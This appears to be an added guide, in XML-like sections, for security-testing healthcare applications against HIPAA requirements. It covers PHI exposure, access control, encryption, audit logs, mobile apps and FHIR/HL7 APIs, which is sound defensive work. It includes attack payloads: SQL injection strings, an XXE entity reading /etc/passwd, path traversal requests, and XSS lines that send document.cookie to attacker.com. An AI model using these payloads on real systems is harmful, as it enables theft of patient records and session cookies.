@@ -1,0 +1,702 @@
+<hipaa_security_guide>
+<title>HIPAA SECURITY TESTING</title>
+
+<critical>Health Insurance Portability and Accountability Act (HIPAA) security testing ensures the confidentiality, integrity, and availability of Protected Health Information (PHI). Testing must cover access controls, encryption, audit logging, and security of healthcare-specific applications including mobile health apps and health data APIs.</critical>
+
+<scope>
+- Protected Health Information (PHI) exposure
+- Electronic Protected Health Information (ePHI) security
+- Access control and authentication testing
+- Encryption requirements (in-transit and at-rest)
+- Audit logging and monitoring
+- Business Associate Agreement (BAA) compliance
+- Mobile health application security
+- HL7/FHIR API security
+- Patient consent management
+- Breach notification requirements
+</scope>
+
+<methodology>
+1. Identify all PHI storage, transmission, and processing points.
+2. Test for unencrypted or exposed PHI/ePHI.
+3. Validate access controls and authentication mechanisms.
+4. Test encryption implementation for data in-transit and at-rest.
+5. Verify audit logging coverage and integrity.
+6. Assess API security for health data exchanges.
+7. Test mobile health apps for security vulnerabilities.
+8. Validate consent and authorization workflows.
+</methodology>
+
+<phi_exposure_detection>
+<phi_identification>
+{% raw %}
+# Protected Health Information (PHI) includes 18 identifiers:
+
+# 1. Names (patient, family, employers)
+# 2. Geographic subdivisions (street, city, ZIP)
+# 3. Dates (birth, admission, discharge, death)
+# 4. Telephone numbers
+# 5. Fax numbers
+# 6. Email addresses
+# 7. Social Security numbers
+# 8. Medical record numbers (MRN)
+# 9. Health plan beneficiary numbers
+# 10. Account numbers
+# 11. Certificate/license numbers
+# 12. Vehicle identifiers
+# 13. Device identifiers and serial numbers
+# 14. URLs
+# 15. IP addresses
+# 16. Biometric identifiers
+# 17. Full-face photographs
+# 18. Any other unique identifying number
+
+# Test for PHI exposure in:
+# - API responses
+# - URL parameters
+# - Log files
+# - Error messages
+# - Search results
+# - Email notifications
+# - PDF reports
+# - Database backups
+{% endraw %}
+</phi_identification>
+
+<api_phi_leakage>
+{% raw %}
+# Test healthcare APIs for PHI exposure:
+
+GET /api/patients
+# Should NOT return full PHI without authorization
+
+# Unauthorized access:
+GET /api/patient/12345/records
+# Without valid authentication/authorization
+
+# IDOR testing:
+GET /api/patient/12345/medical-history  # Own records
+GET /api/patient/12346/medical-history  # Other patient
+# Should be blocked
+
+# Response data minimization:
+GET /api/appointments
+# Should only return necessary data, not full PHI
+
+# Test for PHI in error messages:
+GET /api/patient/invalid-id
+Response: {
+  "error": "Patient John Doe (SSN: 123-45-6789) not found"
+}
+# PHI in error message - violation
+
+# Search functionality:
+GET /api/search?q=diabetes
+# Should not return other patients' data
+
+# Bulk export testing:
+GET /api/patients/export
+# Should require strong authorization
+# Should log access
+{% endraw %}
+</api_phi_leakage>
+
+<logging_phi_exposure>
+{% raw %}
+# PHI in log files is a common violation:
+
+# Check application logs:
+tail -f /var/log/app.log
+# Look for:
+# - Patient names
+# - SSNs
+# - Medical record numbers
+# - Diagnoses
+# - Treatment details
+
+# Example violations:
+2024-01-15 10:30:45 INFO Patient John Doe accessed
+2024-01-15 10:31:12 DEBUG SSN: 123-45-6789 validated
+2024-01-15 10:31:45 ERROR Failed to save record for MRN: ABC123
+
+# Compliant logging:
+2024-01-15 10:30:45 INFO Patient ID [REDACTED] accessed
+2024-01-15 10:31:12 DEBUG Authentication successful for user [HASH]
+2024-01-15 10:31:45 ERROR Failed to save record [ID: REDACTED]
+
+# Check for PHI in:
+grep -r "SSN" /var/log/
+grep -r "patient.*name" /var/log/
+grep -r "diagnosis" /var/log/
+{% endraw %}
+</logging_phi_exposure>
+
+<url_parameter_phi>
+{% raw %}
+# PHI in URLs is a violation:
+
+# Non-compliant examples:
+GET /patient?name=John%20Doe&ssn=123-45-6789
+GET /records/123-45-6789/medical-history
+GET /appointments?patient_name=Jane%20Smith
+
+# URLs can be logged by:
+# - Web servers
+# - Proxies
+# - Browser history
+# - Referrer headers
+# - Analytics tools
+
+# Compliant alternatives:
+POST /patient/lookup
+Body: {"mrn": "ABC123"}  # Encrypted/tokenized ID
+
+GET /records/[encrypted-token]/medical-history
+{% endraw %}
+</url_parameter_phi>
+</phi_exposure_detection>
+
+<access_control_testing>
+<role_based_access>
+{% raw %}
+# HIPAA requires role-based access control:
+
+# User roles in healthcare:
+# - Patient: View own records only
+# - Doctor: View assigned patients
+# - Nurse: View patients in department
+# - Administrator: Manage system, limited PHI access
+# - Billing: Financial data, limited clinical data
+# - Researcher: De-identified data only
+
+# Test horizontal privilege escalation:
+# Login as Patient A
+GET /api/patient/A/records  # Should work
+GET /api/patient/B/records  # Should fail
+
+# Test vertical privilege escalation:
+# Login as Nurse
+GET /api/patient/123/records  # Should work if assigned
+PUT /api/patient/123/diagnosis  # Should work if assigned
+DELETE /api/patient/123  # Should fail (admin only)
+
+# Provider-patient relationship:
+# Access should be based on current care relationship
+GET /api/patient/456/records
+# Should check if provider is currently treating patient
+
+# Break-glass access:
+# Emergency access should be logged and audited
+POST /api/emergency-access
+{"patient_id": "789", "reason": "cardiac_arrest"}
+# Should grant temporary access but trigger alerts
+{% endraw %}
+</role_based_access>
+
+<minimum_necessary_access>
+{% raw %}
+# HIPAA requires "minimum necessary" principle:
+
+# Test for excessive data exposure:
+
+# Nurse viewing patient list:
+GET /api/patients/list
+# Should return: ID, Name, Room Number
+# Should NOT return: Full medical history, SSN, diagnosis
+
+# Billing department:
+GET /api/patient/123/billing
+# Should return: Demographics, insurance, charges
+# Should NOT return: Clinical notes, lab results
+
+# Research access:
+GET /api/research/dataset
+# Should return: De-identified data only
+# No direct identifiers (names, SSNs, MRNs)
+
+# Test data filtering:
+# Request as receptionist
+GET /api/patient/123
+# Response should exclude sensitive clinical data
+{% endraw %}
+</minimum_necessary_access>
+
+<authentication_requirements>
+{% raw %}
+# HIPAA requires strong authentication:
+
+# Test password policies:
+# Minimum 8 characters
+# Complexity requirements
+# Regular password changes
+# No password reuse
+
+# Weak password testing:
+POST /register
+{"username": "doctor1", "password": "password"}
+# Should be rejected
+
+# MFA testing for sensitive access:
+POST /login
+{"username": "admin", "password": "StrongPass123!"}
+# Should require second factor for admin accounts
+
+# Automatic logoff:
+# Sessions should timeout after inactivity
+# 15-20 minutes typical
+# Set session, wait, attempt access
+GET /api/patients
+# Should require re-authentication
+
+# Unique user IDs:
+# No shared accounts
+# Test for generic accounts (admin, nurse, doctor)
+SELECT DISTINCT username FROM users;
+# Should be individual identifiers
+{% endraw %}
+</authentication_requirements>
+</access_control_testing>
+
+<encryption_validation>
+<transmission_encryption>
+{% raw %}
+# HIPAA requires encryption of ePHI in transit:
+
+# Test TLS configuration:
+openssl s_client -connect health-app.example.com:443 -tls1
+# TLS 1.0/1.1 should fail
+
+openssl s_client -connect health-app.example.com:443 -tls1_2
+openssl s_client -connect health-app.example.com:443 -tls1_3
+# Should succeed
+
+# Test cipher suites:
+nmap --script ssl-enum-ciphers -p 443 health-app.example.com
+# Should use strong ciphers (AES-GCM, ChaCha20)
+
+# Check for mixed content:
+# HTTPS page loading HTTP resources
+curl https://health-app.example.com/ | grep -i "http://"
+
+# Mobile app encryption:
+# Intercept traffic with proxy
+# All PHI transmission should be encrypted
+# No cleartext patient data
+
+# Email encryption:
+# PHI sent via email must be encrypted
+# Test unencrypted email with PHI
+# Should be blocked or encrypted automatically
+{% endraw %}
+</transmission_encryption>
+
+<at_rest_encryption>
+{% raw %}
+# Test encryption of stored ePHI:
+
+# Database encryption:
+# Check for Transparent Data Encryption (TDE)
+SELECT name, is_encrypted FROM sys.databases;
+
+# File encryption:
+# Check for encrypted file systems
+df -h | grep -i encrypt
+
+# Backup encryption:
+# Test backup files for encryption
+ls -la /backups/*.sql
+file backup.sql  # Should show encrypted/compressed
+
+# Test for unencrypted PHI:
+strings /data/database.db | grep -i "patient\|diagnosis"
+# Should not reveal plaintext PHI
+
+# Mobile device encryption:
+# Test if device/app storage is encrypted
+# Extract app data and examine
+adb pull /data/data/com.example.healthapp/
+strings databases/* | grep -i "patient"
+
+# Removable media:
+# PHI on USB drives must be encrypted
+# Test for unencrypted PHI on media
+{% endraw %}
+</at_rest_encryption>
+
+<encryption_key_management>
+{% raw %}
+# Test encryption key management:
+
+# Keys should not be stored with data:
+find /var/www -name "*.key"
+grep -r "encryption_key" /var/www/config/
+# Keys in application code is a violation
+
+# Key rotation:
+# Check for key rotation procedures
+# Keys should be rotated periodically
+
+# Key access control:
+# Who can access encryption keys?
+# Should be limited to authorized personnel
+
+# Key backup and recovery:
+# Test key recovery procedures
+# Keys should be backed up securely
+{% endraw %}
+</encryption_key_management>
+</encryption_validation>
+
+<audit_logging>
+<access_logging>
+{% raw %}
+# HIPAA requires comprehensive audit logging:
+
+# Required log events:
+# - PHI access (who accessed what, when)
+# - Authentication attempts (success/failure)
+# - Authorization failures
+# - PHI modifications
+# - PHI deletions
+# - Security setting changes
+# - Audit log access
+
+# Test log completeness:
+# Access patient record
+GET /api/patient/123/records
+# Check audit log
+SELECT * FROM audit_log WHERE resource_id='123' ORDER BY timestamp DESC;
+# Should contain:
+# - User ID
+# - Timestamp
+# - Action (READ)
+# - Patient ID
+# - Source IP
+# - Success/failure
+
+# Test modification logging:
+PUT /api/patient/123/diagnosis
+{"diagnosis": "Type 2 Diabetes"}
+# Audit log should capture:
+# - Old value
+# - New value
+# - User who made change
+# - Reason/justification (if required)
+
+# Test deletion logging:
+DELETE /api/patient/123/record/456
+# Should log deletion details
+# May require soft delete with retention
+{% endraw %}
+</access_logging>
+
+<log_integrity>
+{% raw %}
+# Test audit log integrity:
+
+# Attempt log tampering:
+# Try to delete audit logs
+DELETE FROM audit_log WHERE user_id='admin';
+# Should be prevented
+
+# Try to modify logs
+UPDATE audit_log SET action='authorized' WHERE action='denied';
+# Should be prevented
+
+# Log immutability:
+# Logs should be write-only
+# Consider using:
+# - Append-only file systems
+# - WORM storage
+# - Log forwarding to SIEM
+# - Cryptographic signing
+
+# Test log access:
+# Who can view audit logs?
+SELECT * FROM audit_log;
+# Should require special privileges
+
+# Log retention:
+# HIPAA requires 6 years retention
+ls -la /var/log/archive/
+# Check for logs from previous years
+{% endraw %}
+</log_integrity>
+
+<breach_detection>
+{% raw %}
+# Test for breach detection capabilities:
+
+# Unusual access patterns:
+# - Access to many patient records in short time
+# - Access outside normal hours
+# - Access from unusual location
+# - Access to VIP patient records
+
+# Simulated breach:
+# Access 100 patient records rapidly
+for i in {1..100}; do
+  curl -H "Authorization: Bearer $TOKEN" \
+    "https://api.example.com/patient/$i/records"
+done
+# Should trigger alerts
+
+# Download large amounts of data:
+GET /api/patients/export?limit=10000
+# Should be logged and possibly blocked
+
+# Test alerting:
+# Are administrators notified of suspicious activity?
+# Check alert configurations
+{% endraw %}
+</breach_detection>
+</audit_logging>
+
+<mobile_health_apps>
+<mobile_app_security>
+{% raw %}
+# Test mobile health app security:
+
+# Data storage:
+# Extract app data
+adb backup -f app.ab com.example.healthapp
+# Examine for unencrypted PHI
+strings app.ab | grep -i "patient\|diagnosis\|ssn"
+
+# Network traffic:
+# Intercept with Burp Suite/Charles Proxy
+# Check for:
+# - Unencrypted PHI transmission
+# - API keys in headers
+# - Weak authentication
+
+# Authentication:
+# Test biometric authentication bypass
+# Test session management
+# Test "remember me" functionality
+
+# Local authentication:
+# Test PIN/password storage
+# Should use secure storage (Keychain/Keystore)
+
+# Certificate pinning:
+# Test SSL pinning bypass
+# App should reject invalid certificates
+
+# Root/jailbreak detection:
+# Test on rooted/jailbroken device
+# App should detect and restrict functionality
+
+# Code obfuscation:
+# Decompile app
+apktool d healthapp.apk
+# Check for hardcoded secrets/PHI
+{% endraw %}
+</mobile_app_security>
+
+<mobile_data_leakage>
+{% raw %}
+# Test for data leakage:
+
+# Clipboard:
+# Copy sensitive data
+# Check if cleared on app exit
+
+# Screenshots:
+# Take screenshot of PHI screen
+# App should prevent or blur sensitive data
+
+# Background app snapshots:
+# Switch apps while viewing PHI
+# Check if data visible in app switcher
+
+# Logs:
+# Check device logs
+adb logcat | grep -i "patient\|diagnosis"
+# Should not contain PHI
+
+# Third-party libraries:
+# Analytics SDKs
+# Crash reporting
+# Ad networks
+# Should not receive PHI
+
+# Push notifications:
+# Test notification content
+# Should not contain PHI details
+{% endraw %}
+</mobile_data_leakage>
+</mobile_health_apps>
+
+<api_security>
+<fhir_api_testing>
+{% raw %}
+# FHIR (Fast Healthcare Interoperability Resources) testing:
+
+# Authentication:
+# SMART on FHIR OAuth2 flow
+GET /fhir/Patient/123
+# Should require valid OAuth2 token
+
+# Authorization scopes:
+# Test scope enforcement
+# patient/Patient.read - read patient's own data
+# user/Patient.read - read any patient data
+# system/Patient.read - system-level access
+
+# Test scope violations:
+# Token with patient/Patient.read scope
+GET /fhir/Patient/456  # Different patient
+# Should fail
+
+# Search parameter injection:
+GET /fhir/Patient?name=John');DROP TABLE patients--
+# Should be sanitized
+
+# Bulk data export:
+GET /fhir/$export
+# Should require authorization
+# Should log access
+
+# Test for open FHIR servers:
+GET /fhir/metadata
+# Should require authentication
+# Check CapabilityStatement for security
+
+# Resource access control:
+GET /fhir/Observation?patient=123
+# Should only return authorized observations
+{% endraw %}
+</fhir_api_testing>
+
+<hl7_security>
+{% raw %}
+# HL7 message security testing:
+
+# HL7 v2 messages:
+# Test for unencrypted transmission
+# HL7 messages often contain full PHI
+
+# Message injection:
+# Inject malicious HL7 segments
+MSH|^~\&|SENDING_APP|SENDING_FAC|RECEIVING_APP|RECEIVING_FAC|...
+PID|1||12345^^^MRN||Doe^John^||19800101|M|||...
+
+# Test for:
+# - SQL injection in message handling
+# - Command injection in processing
+# - Message replay attacks
+# - Unauthorized message submission
+
+# HL7 v3 / CDA documents:
+# Test XML injection
+# Test XXE vulnerabilities
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<ClinicalDocument>&xxe;</ClinicalDocument>
+{% endraw %}
+</hl7_security>
+</api_security>
+
+<consent_management>
+<consent_validation>
+{% raw %}
+# Test consent enforcement:
+
+# Patient consent forms:
+# - Treatment consent
+# - Data sharing consent
+# - Research participation
+
+# Access without consent:
+GET /api/patient/123/share-with-research
+# Without patient consent should fail
+
+# Consent revocation:
+POST /api/patient/123/revoke-consent
+{"consent_type": "research"}
+# Further research access should be blocked
+
+# Consent granularity:
+# Test if system respects specific consents
+# Patient may consent to some uses but not others
+
+# Third-party data sharing:
+# Test Business Associate access
+# Should be logged and authorized
+GET /api/external/business-associate/patient/123
+# Should verify BAA in place
+{% endraw %}
+</consent_validation>
+</consent_management>
+
+<common_payloads>
+{% raw %}
+# SQL injection in healthcare fields:
+' OR 1=1--
+'; DROP TABLE patients--
+1 UNION SELECT ssn FROM patients--
+
+# XSS in patient records:
+<script>fetch('https://attacker.com/?data='+document.cookie)</script>
+<img src=x onerror='new Image().src="http://attacker.com/"+document.cookie'>
+
+# IDOR testing:
+GET /api/patient/1/records  # Own patient
+GET /api/patient/2/records  # Other patient
+
+# Path traversal:
+GET /records/../../etc/passwd
+GET /patient-files/../../../../database.backup
+
+# API parameter tampering:
+PUT /api/patient/1
+{"patient_id": 2, "diagnosis": "Modified"}
+# Attempt to modify other patient's data
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate exposed PHI (name, SSN, MRN, diagnosis) without authorization.
+2. Show weak or missing encryption for ePHI transmission or storage.
+3. Prove access control bypass to view other patients' health records.
+4. Document missing or inadequate audit logging of PHI access.
+5. Show PHI in log files, URLs, or error messages.
+6. Demonstrate lack of proper authentication for sensitive data access.
+</validation>
+
+<false_positives>
+- De-identified data sets for research (no PHI identifiers)
+- Properly encrypted ePHI with secure key management
+- Access to own health records by patient
+- Authorized provider access with proper relationship
+- Comprehensive audit logs with integrity protection
+- Strong authentication with MFA for sensitive access
+</false_positives>
+
+<impact>
+- Massive HIPAA violation with civil and criminal penalties
+- Fines up to $1.5M per violation category per year
+- Potential criminal charges (up to 10 years prison)
+- Breach notification requirements (expensive, reputation damage)
+- Loss of patient trust and medical practice reputation
+- Legal liability from affected patients
+- Regulatory investigations and corrective action plans
+- Possible suspension of healthcare operations
+</impact>
+
+<pro_tips>
+1. Focus on PHI flows - identify all PHI storage and transmission points.
+2. Test access controls rigorously - IDOR is common in healthcare apps.
+3. Check audit logs for completeness and integrity.
+4. Test mobile health apps thoroughly - often weakest link.
+5. Verify encryption for all ePHI (in-transit and at-rest).
+6. Look for PHI in logs, URLs, error messages.
+7. Test FHIR/HL7 API security if present.
+8. Validate "minimum necessary" access principle.
+9. Check for proper consent management.
+10. Test break-glass emergency access procedures.
+</pro_tips>
+
+<remember>HIPAA security is about protecting PHI/ePHI confidentiality, integrity, and availability. The most critical tests are detecting unauthorized PHI access, verifying encryption of ePHI, testing access controls, and ensuring comprehensive audit logging. Mobile health apps often have weaker security than web applications. FHIR/HL7 APIs require specific testing for healthcare interoperability standards. Audit logs must be complete, immutable, and retained for 6 years.</remember>
+</hipaa_security_guide>
